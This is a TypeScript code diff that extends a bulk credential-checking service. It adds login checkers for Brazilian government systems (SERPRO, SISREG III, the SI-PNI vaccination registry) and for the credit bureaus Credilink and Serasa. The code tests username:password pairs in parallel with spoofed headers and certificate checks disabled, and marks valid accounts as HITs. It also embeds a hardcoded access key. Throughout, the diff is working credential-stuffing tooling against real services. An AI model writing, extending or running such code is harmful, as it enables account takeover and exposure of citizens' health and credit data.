@@ -66,7 +66,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "consultcenter" | "mind7";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa";
 
 export interface CheckResult {
   credential: string;
@@ -223,6 +223,10 @@ function sha512(text: string): string {
   return createHash("sha512").update(text, "ascii").digest("hex");
 }
 
+function sha256(text: string): string {
+  return createHash("sha256").update(text).digest("hex");
+}
+
 function extractViewState(html: string): string {
   // Standard JSF ViewState hidden input
   const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
@@ -340,9 +344,180 @@ async function checkDataSUS(login: string, password: string): Promise<CheckResul
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SERPRO CHECKER — https://radar.serpro.gov.br
+//  Logic: POST JSON with Android UA → check response for "token" field
+//  Note: API uses self-signed cert; curl -k skips verification.
+// ═══════════════════════════════════════════════════════════════════════════════
+const SERPRO_URL     = "https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario";
+const SERPRO_TIMEOUT = 15_000;
+const SERPRO_UA      = "Dalvik/2.1.0 (Linux; Android 14)";
+
+async function checkSerpro(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const body       = JSON.stringify({ imei: "", latitude: 0, longitude: 0, password, username: login });
+
+  try {
+    const result = await runCurl([
+      "-k",                                            // ignore self-signed cert
+      "-s",
+      "-X", "POST",
+      "-H", `User-Agent: ${SERPRO_UA}`,
+      "-H", "Connection: Keep-Alive",
+      "-H", "Accept-Encoding: gzip",
+      "-H", "Content-Type: application/json",
+      "-d", body,
+      SERPRO_URL,
+    ], SERPRO_TIMEOUT);
+
+    const text = result.body.trim();
+
+    // Empty or non-JSON (WAF block / gateway error)
+    if (!text || result.statusCode === 0 || result.statusCode >= 502) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    }
+
+    // WAF / firewall rejection (HTML response instead of JSON)
+    if (text.startsWith("<") || text.includes("Request Rejected") || text.includes("<html")) {
+      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+    }
+
+    let json: Record<string, unknown>;
+    try { json = JSON.parse(text); } catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }
+
+    // HIT: response contains a JWT token
+    if (json.token && typeof json.token === "string") {
+      return { credential, login, status: "HIT", detail: "token_ok" };
+    }
+
+    // Expired / blocked account (has stok but no token)
+    if (json.stok) {
+      return { credential, login, status: "FAIL", detail: `stok_code_${json.code ?? "?"}` };
+    }
+
+    // Parse friendly message from API response
+    const mensagem = String(json.mensagem ?? json.message ?? json.erro ?? "").trim();
+
+    // Explicit error codes
+    const code = String(json.code ?? json.status ?? "").toLowerCase();
+    if (code.includes("invalid") || code.includes("wrong") || code.includes("401")) {
+      return { credential, login, status: "FAIL", detail: mensagem || `auth_failed:${code}` };
+    }
+
+    if (result.statusCode === 401 || result.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: mensagem || `http_${result.statusCode}` };
+    }
+
+    // User not found or other API error = FAIL
+    if (mensagem) {
+      return { credential, login, status: "FAIL", detail: mensagem.slice(0, 100) };
+    }
+
+    return { credential, login, status: "FAIL", detail: text.slice(0, 120) };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `SERPRO_EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SISREG III CHECKER — https://sisregiii.saude.gov.br
+//  Logic: POST SHA-256 hashed password → parse HTML for profile markers
+// ═══════════════════════════════════════════════════════════════════════════════
+const SISREG_URL     = "https://sisregiii.saude.gov.br/";
+const SISREG_TIMEOUT = 20_000;
+
+async function checkSisreg(login: string, password: string): Promise<CheckResult> {
+  const credential  = `${login}:${password}`;
+  const senhaHash   = sha256(password);
+
+  const postBody = [
+    `usuario=${encodeURIComponent(login)}`,
+    `senha=`,
+    `senha_256=${senhaHash}`,
+    `etapa=ACESSO`,
+    `logout=`,
+  ].join("&");
+
+  try {
+    const result = await runCurl([
+      "-k",
+      "-s",
+      "-X", "POST",
+      "-H", "Host: sisregiii.saude.gov.br",
+      "-H", "Connection: keep-alive",
+      "-H", "Cache-Control: max-age=0",
+      "-H", `sec-ch-ua: "Not A(Brand";v="99", "Opera";v="107", "Chromium";v="121"`,
+      "-H", "sec-ch-ua-mobile: ?0",
+      "-H", `sec-ch-ua-platform: "Windows"`,
+      "-H", "Upgrade-Insecure-Requests: 1",
+      "-H", `Origin: ${SISREG_URL}`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+      "-H", "Sec-Fetch-Site: same-origin",
+      "-H", "Sec-Fetch-Mode: navigate",
+      "-H", "Sec-Fetch-User: ?1",
+      "-H", "Sec-Fetch-Dest: document",
+      "-H", `Referer: ${SISREG_URL}cgi-bin/index?logout=1`,
+      "-H", "Accept-Encoding: gzip, deflate, br",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "--data-raw", postBody,
+      `${SISREG_URL}`,
+    ], SISREG_TIMEOUT);
+
+    if (result.statusCode === 0 || result.statusCode >= 502) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    }
+
+    const body = result.body;
+
+    // ── FAIL markers ──────────────────────────────────────────────────────────
+    if (body.includes("Login ou senha incorreto(s).")) {
+      return { credential, login, status: "FAIL", detail: "senha_invalida" };
+    }
+    if (body.includes("Este operador foi desativado pelo administrador.")) {
+      return { credential, login, status: "FAIL", detail: "conta_desativada" };
+    }
+
+    // ── HIT markers ───────────────────────────────────────────────────────────
+    const hitMarkers = ["<p>Perfil</p>", "logout", "Sair", "Principal", "Cadastro"];
+    const isHit = hitMarkers.some(m => body.includes(m));
+    if (isHit) {
+      // Try to capture the UNIDADE from the response
+      const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
+                           body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
+      const unidade = unidadeMatch
+        ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
+        : null;
+
+      // Restricted access — account exists but cannot log in on this day/time
+      if (body.includes("Acesso n") && body.includes("o permitido")) {
+        return { credential, login, status: "HIT", detail: `acesso_restrito${unidade ? ` | ${unidade}` : ""}` };
+      }
+
+      return { credential, login, status: "HIT", detail: unidade ? `Unidade: ${unidade}` : "login_ok" };
+    }
+
+    // ── CUSTOM: access denied but account recognised ───────────────────────
+    if (body.includes("Acesso n") && body.includes("o permitido")) {
+      return { credential, login, status: "HIT", detail: "acesso_restrito_sem_perfil" };
+    }
+
+    // ── Fallback ──────────────────────────────────────────────────────────────
+    if (body.length < 500) {
+      return { credential, login, status: "ERROR", detail: "resposta_muito_curta" };
+    }
+
+    return { credential, login, status: "FAIL", detail: "nenhum_marcador" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `SISREG_EXCEPTION:${String(e)}` };
+  }
+}
+
 // ── Concurrency pool (no deps needed) ────────────────────────────────────────
 // Runs `fn` for every item with at most `concurrency` tasks in parallel,
 // preserving result order. Fast replacement for p-limit.
+// Each worker catches unexpected throws so the pool NEVER stops early.
 async function pMap<T, R>(
   items:       T[],
   fn:          (item: T, idx: number) => Promise<R>,
@@ -355,7 +530,12 @@ async function pMap<T, R>(
   const worker = async () => {
     while (next < items.length) {
       const i = next++;
-      results[i] = await fn(items[i], i);
+      try {
+        results[i] = await fn(items[i], i);
+      } catch (e) {
+        // Safety net — mappers should never throw, but if they do the pool continues
+        results[i] = { status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
+      }
       done++;
       onResult?.(results[i], done);
     }
@@ -524,15 +704,439 @@ async function checkMind7(login: string, password: string): Promise<CheckResult>
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SIPNI CHECKER (v2) — https://sipni.datasus.gov.br (4-step JSF AJAX flow)
+//  Logic: GET page → partial AJAX POST 1 → update ViewState → partial AJAX POST 2
+//         → follow redirect XML → GET pacientes page → verify markers
+// ═══════════════════════════════════════════════════════════════════════════════
+const SIPNI_URL          = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
+const SIPNI_PACIENTES    = "https://sipni.datasus.gov.br/si-pni-web/faces/paciente/listarPaciente.jsf";
+const SIPNI_TIMEOUT      = 25_000;
+
+async function checkSipni(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/sipni_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    // ── Step 1: GET login page ────────────────────────────────────────────────
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "-k", "--compressed",
+        "-c", cookieFile,
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+        "-H", "Connection: keep-alive",
+        "-H", "DNT: 1",
+        SIPNI_URL,
+      ], SIPNI_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    if (getResult.statusCode !== 200) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
+    }
+
+    const html      = getResult.body;
+    const viewState = extractViewState(html);
+    const formId    = extractFormId(html);
+    const submitId  = extractSubmitId(html, formId);
+    const senhaHash = sha512(password);
+
+    if (!formId || !submitId) {
+      return { credential, login, status: "ERROR", detail: "NO_FORM_FOUND" };
+    }
+
+    // ── Step 2: Partial AJAX POST 1 (authenticate) ───────────────────────────
+    const ajaxBody1 = [
+      "javax.faces.partial.ajax=true",
+      `javax.faces.source=${encodeURIComponent(submitId)}`,
+      `javax.faces.partial.execute=${encodeURIComponent(submitId)}`,
+      "javax.faces.behavior.event=click",
+      "javax.faces.partial.event=click",
+      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
+      `javax.faces.ViewState=${encodeURIComponent(viewState)}`,
+      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
+      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
+      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
+      "AJAXREQUEST=_viewRoot",
+    ].join("&");
+
+    let post1: CurlResult;
+    try {
+      post1 = await runCurl([
+        "-k", "--compressed",
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
+        "-H", `Origin: https://sipni.datasus.gov.br`,
+        "-H", `Referer: ${SIPNI_URL}`,
+        "-H", "X-Requested-With: XMLHttpRequest",
+        "-H", "Faces-Request: partial/ajax",
+        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
+        "--data-raw", ajaxBody1,
+        "--max-redirs", "0",
+        SIPNI_URL,
+      ], SIPNI_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `AJAX1_ERROR:${String(e)}` };
+    }
+
+    const xml1 = post1.body;
+
+    // Detect wrong credentials early
+    if (xml1.toLowerCase().includes("usu") && xml1.toLowerCase().includes("ou senha inv")) {
+      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos" };
+    }
+    if (xml1.toLowerCase().includes("acesso negado") || xml1.toLowerCase().includes("bloqueado")) {
+      return { credential, login, status: "ERROR", detail: "BLOCK_AJAX1" };
+    }
+
+    // Extract updated ViewState from XML response
+    let newViewState = viewState;
+    const vsFromCData = xml1.match(/<update[^>]+javax\.faces\.ViewState[^>]*><!\[CDATA\[(.*?)\]\]><\/update>/);
+    const vsFromAttr  = xml1.match(/id="javax\.faces\.ViewState"\s+value="([^"]+)"/);
+    if (vsFromCData)    newViewState = vsFromCData[1];
+    else if (vsFromAttr) newViewState = vsFromAttr[1];
+
+    // ── Step 3: Partial AJAX POST 2 (complete login) ─────────────────────────
+    const ajaxBody2 = [
+      "javax.faces.partial.ajax=true",
+      `javax.faces.source=${encodeURIComponent(submitId)}`,
+      "javax.faces.partial.execute=%40all",
+      `${encodeURIComponent(submitId)}=${encodeURIComponent(submitId)}`,
+      `${encodeURIComponent(formId)}=${encodeURIComponent(formId)}`,
+      `javax.faces.ViewState=${encodeURIComponent(newViewState)}`,
+      `${encodeURIComponent(`${formId}:usuario`)}=${encodeURIComponent(login)}`,
+      `${encodeURIComponent(`${formId}:senha`)}=${encodeURIComponent(senhaHash)}`,
+    ].join("&");
+
+    let post2: CurlResult;
+    try {
+      post2 = await runCurl([
+        "-k", "--compressed",
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
+        "-H", `Origin: https://sipni.datasus.gov.br`,
+        "-H", `Referer: ${SIPNI_URL}`,
+        "-H", "X-Requested-With: XMLHttpRequest",
+        "-H", "Faces-Request: partial/ajax",
+        "-H", "Accept: application/xml, text/xml, */*; q=0.01",
+        "--data-raw", ajaxBody2,
+        "--max-redirs", "0",
+        SIPNI_URL,
+      ], SIPNI_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `AJAX2_ERROR:${String(e)}` };
+    }
+
+    const xml2 = post2.body;
+
+    // Detect wrong credentials (sometimes appears in step 2 as well)
+    if (xml2.toLowerCase().includes("usu") && xml2.toLowerCase().includes("ou senha inv")) {
+      return { credential, login, status: "FAIL", detail: "usuario_ou_senha_invalidos_step2" };
+    }
+
+    // Extract redirect URL from XML: <redirect url="..."></redirect>
+    const redirectMatch = xml2.match(/<redirect\s+url="([^"]+)"><\/redirect>/);
+    const redirectUrl   = redirectMatch
+      ? (redirectMatch[1].startsWith("/")
+          ? `https://sipni.datasus.gov.br${redirectMatch[1]}`
+          : redirectMatch[1])
+      : null;
+
+    if (!redirectUrl) {
+      // No redirect in XML — might still be an inline failure
+      const xml2Low = xml2.toLowerCase();
+      if (xml2Low.includes("inicio.jsf") || xml2Low.includes("type=\"password\"") || xml2Low.includes("j_idt23:senha")) {
+        return { credential, login, status: "FAIL", detail: "no_redirect_still_on_login" };
+      }
+      // Ambiguous — fall through to pacientes check
+    }
+
+    // ── Step 4: Verify access via pacientes page ──────────────────────────────
+    // If we got a redirect URL that's not the login page, follow it
+    // Then hit the pacientes URL to confirm session
+    const targetUrl = redirectUrl && !redirectUrl.includes("inicio.jsf") ? redirectUrl : SIPNI_PACIENTES;
+    let finalResult: CurlResult;
+    try {
+      finalResult = await runCurl([
+        "-k", "-s",
+        "-b", cookieFile,
+        "-H", `User-Agent: ${MOBILE_UA}`,
+        "-L",          // follow redirects
+        "--max-redirs", "5",
+        targetUrl,
+      ], SIPNI_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `FINAL_GET_ERROR:${String(e)}` };
+    }
+
+    const finalText = finalResult.body.toLowerCase();
+
+    // LIVE markers
+    const liveMarkers = ["pacienteform", "pesquisa de paciente", "listapacientetable",
+                         "nenhum paciente encontrado", "cartão sus", "cadastrar paciente"];
+    for (const m of liveMarkers) {
+      if (finalText.includes(m)) {
+        return { credential, login, status: "HIT", detail: "sipni_dashboard" };
+      }
+    }
+
+    // Heuristic: page is large and doesn't look like the login screen → likely a valid session
+    if (finalResult.body.length > 5000 && !finalText.includes("type=\"password\"") && !finalText.includes("inicio.jsf")) {
+      return { credential, login, status: "HIT", detail: "large_page_no_login_form" };
+    }
+
+    // DIE markers
+    const dieMarkers = ["usuário ou senha inválidos", "senha incorreta", "sua sessão expirou",
+                        "efetue o login", "problemas para se logar?", "j_idt23:senha", "j_idt26:senha"];
+    for (const m of dieMarkers) {
+      if (finalText.includes(m)) return { credential, login, status: "FAIL", detail: `die_marker:${m.slice(0,30)}` };
+    }
+
+    if (finalText.includes("type=\"password\"") || finalText.includes("inicio.jsf")) {
+      return { credential, login, status: "FAIL", detail: "redirected_to_login" };
+    }
+
+    if (finalResult.body.length < 1000) {
+      return { credential, login, status: "ERROR", detail: "response_too_short" };
+    }
+
+    return { credential, login, status: "FAIL", detail: "no_markers_found" };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CREDILINK CHECKER — app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net
+//  Logic: POST JSON → check idToken in response
+//         Handle "UserHasSessionActive" by invalidating old session first.
+// ═══════════════════════════════════════════════════════════════════════════════
+const CREDILINK_AUTH_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net/credicorp/api/user/authenticate";
+const CREDILINK_BASE_URL = "https://app-credicorp-backend-brazilsouth-prd-01.azurewebsites.net";
+const CREDILINK_TIMEOUT  = 20_000;
+const CREDILINK_PRODUCT  = "84";
+const CREDILINK_KEY      = "YXRlbmFAcm9vdDphdGVuYUBCUTJhSiM2VEIyaWI=";
+
+async function checkCrediLink(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const body       = JSON.stringify({
+    login,
+    password,
+    productId:  CREDILINK_PRODUCT,
+    accessKey:  CREDILINK_KEY,
+    ip:         "0.0.0.0",
+  });
+
+  const attempt = async (): Promise<CurlResult> => runCurl([
+    "-k", "-s",
+    "-X", "POST",
+    "-H", "Content-Type: application/json",
+    "-H", `User-Agent: ${DESKTOP_UA}`,
+    "-d", body,
+    CREDILINK_AUTH_URL,
+  ], CREDILINK_TIMEOUT);
+
+  try {
+    let result = await attempt();
+
+    if (result.statusCode === 0 || result.statusCode >= 502) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    }
+
+    let json: Record<string, unknown>;
+    try { json = JSON.parse(result.body.trim()); }
+    catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }
+
+    // Handle "UserHasSessionActive" — invalidate old session then retry
+    const details = Array.isArray(json.details) ? json.details as Record<string, unknown>[] : [];
+    if (details[0]?.detailedMessage === "UserHasSessionActive") {
+      const action = details[0]?.action as Record<string, string> | undefined;
+      const href   = action?.href;
+      const tk     = action?.temporaryToken;
+      if (href && tk) {
+        // Invalidate session
+        await runCurl([
+          "-k", "-s",
+          "-X", "POST",
+          "-H", `Authorization: Bearer ${tk}`,
+          "-H", `User-Agent: ${DESKTOP_UA}`,
+          `${CREDILINK_BASE_URL}/credicorp/api${href}`,
+        ], CREDILINK_TIMEOUT).catch(() => void 0);
+        // Retry auth
+        result = await attempt();
+        try { json = JSON.parse(result.body.trim()); }
+        catch { return { credential, login, status: "ERROR", detail: "RETRY_INVALID_JSON" }; }
+      }
+    }
+
+    // HIT: token received
+    const idToken = json.idToken;
+    if (idToken && typeof idToken === "string" && idToken.length > 0) {
+      return { credential, login, status: "HIT", detail: "token_ok" };
+    }
+
+    // Common error codes
+    const msg = String(json.message ?? json.erro ?? json.status ?? "").toLowerCase();
+    if (msg.includes("invalid") || msg.includes("inválid") || msg.includes("incorret") || result.statusCode === 401) {
+      return { credential, login, status: "FAIL", detail: `auth_failed:${msg.slice(0, 60)}` };
+    }
+
+    if (result.statusCode === 400 || result.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: `http_${result.statusCode}:${msg.slice(0, 60)}` };
+    }
+
+    return { credential, login, status: "FAIL", detail: result.body.trim().slice(0, 120) };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `CREDILINK_EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SERASA EMPREENDEDOR CHECKER — https://www.serasaempreendedor.com.br/login
+//  Logic: GET login page → follow SSO redirect → extract form → POST creds → check
+//  Note: Serasa uses a JS-heavy SPA with an external identity provider.
+//        This checker makes a best-effort attempt via curl; JS-only flows
+//        will return ERROR:JS_REQUIRED.
+// ═══════════════════════════════════════════════════════════════════════════════
+const SERASA_URL     = "https://www.serasaempreendedor.com.br/login";
+const SERASA_TIMEOUT = 25_000;
+
+async function checkSerasa(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/serasa_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    // ── Step 1: GET login page, follow all redirects to reach SSO ────────────
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "-k", "-s", "-L", "--max-redirs", "10",
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        "-w", "\n%{url_effective}",   // append final URL
+        SERASA_URL,
+      ], SERASA_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
+    }
+
+    // Detect if page is a JS-only SPA (no form rendered in HTML)
+    const html = getResult.body;
+    const hasUsernameField = html.includes('id="username"') || html.includes("name=\"username\"") ||
+                             html.includes("id='username'") || html.includes("name='username'");
+    const hasPasswordField = html.includes('type="password"') || html.includes("type='password'");
+
+    if (!hasUsernameField || !hasPasswordField) {
+      // JS-rendered — try known identity provider endpoints
+      return { credential, login, status: "ERROR", detail: "JS_REQUIRED:no_form_in_html" };
+    }
+
+    // Extract the form's action URL
+    const formActionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/);
+    const formAction = formActionMatch
+      ? (formActionMatch[1].startsWith("http") ? formActionMatch[1] : `https://www.serasaempreendedor.com.br${formActionMatch[1]}`)
+      : SERASA_URL;
+
+    // Extract any CSRF token
+    const csrfMatch = html.match(/name=["']_csrf["'][^>]*value=["']([^"']+)["']/) ||
+                      html.match(/name=["']csrf_token["'][^>]*value=["']([^"']+)["']/);
+    const csrf = csrfMatch?.[1] ?? "";
+
+    // ── Step 2: POST credentials ──────────────────────────────────────────────
+    let postBody = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
+    if (csrf) postBody += `&_csrf=${encodeURIComponent(csrf)}`;
+
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "-k", "-s", "-L", "--max-redirs", "5",
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", `Referer: ${SERASA_URL}`,
+        "-H", "Origin: https://www.serasaempreendedor.com.br",
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        "--data-raw", postBody,
+        formAction,
+      ], SERASA_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const body = postResult.body;
+    const bLow = body.toLowerCase();
+
+    // HIT markers
+    if (bLow.includes("bem-vindo ao nosso tour") || bLow.includes("comprar créditos") ||
+        bLow.includes("comprar creditos") || bLow.includes("meu perfil") ||
+        bLow.includes("consultas realizadas") || bLow.includes("créditos disponíveis")) {
+      return { credential, login, status: "HIT", detail: "serasa_dashboard" };
+    }
+
+    // FAIL markers
+    if (bLow.includes("verifique se o usu") || bLow.includes("senha foram digitados") ||
+        bLow.includes("usuário ou senha incorretos") || bLow.includes("credenciais inválidas") ||
+        bLow.includes("invalid credentials")) {
+      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+    }
+
+    // Still on login page
+    if (bLow.includes('id="username"') || bLow.includes('id="password"') ||
+        bLow.includes('type="password"')) {
+      return { credential, login, status: "FAIL", detail: "still_on_login_page" };
+    }
+
+    if (body.length < 500) {
+      return { credential, login, status: "ERROR", detail: "response_too_short" };
+    }
+
+    return { credential, login, status: "FAIL", detail: "unknown_response" };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
-const CONCURRENCY: Record<CheckerTarget, number> = { datasus: 2, iseek: 2, consultcenter: 3, mind7: 3 };
+const CONCURRENCY: Record<CheckerTarget, number> = {
+  datasus:       2,
+  iseek:         2,
+  sipni:         2,   // 4-step AJAX — conservative
+  consultcenter: 3,
+  mind7:         3,
+  serpro:        4,   // lightweight JSON API
+  sisreg:        2,   // HTML-heavy, slow server
+  credilink:     4,   // JSON API — fast
+  serasa:        2,   // heavy SPA — conservative
+};
+
+function resolveChecker(target: CheckerTarget) {
+  switch (target) {
+    case "datasus":       return checkDataSUS;
+    case "sipni":         return checkSipni;
+    case "consultcenter": return checkConsultCenter;
+    case "mind7":         return checkMind7;
+    case "serpro":        return checkSerpro;
+    case "sisreg":        return checkSisreg;
+    case "credilink":     return checkCrediLink;
+    case "serasa":        return checkSerasa;
+    default:              return checkIseek;
+  }
+}
 
 async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
-  const checker =
-    target === "datasus"      ? checkDataSUS      :
-    target === "consultcenter"? checkConsultCenter :
-    target === "mind7"        ? checkMind7        :
-    checkIseek;
+  const checker     = resolveChecker(target);
   const concurrency = CONCURRENCY[target];
 
   const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);
@@ -558,9 +1162,9 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "consultcenter", "mind7"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
   if (!validTargets.includes(target as CheckerTarget)) {
-    res.status(400).json({ error: "target must be 'iseek', 'datasus', 'consultcenter', or 'mind7'" });
+    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa" });
     return;
   }
 
@@ -595,7 +1199,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "consultcenter", "mind7"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "Invalid target" });
     return;
@@ -633,11 +1237,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
 
   send({ type: "start", total });
 
-  const checker =
-    target === "datasus"       ? checkDataSUS      :
-    target === "consultcenter" ? checkConsultCenter :
-    target === "mind7"         ? checkMind7        :
-    checkIseek;
+  const checker     = resolveChecker(target);
   const concurrency = CONCURRENCY[target];
 
   type CheckResultEx = CheckResult & { wasRetried: boolean };
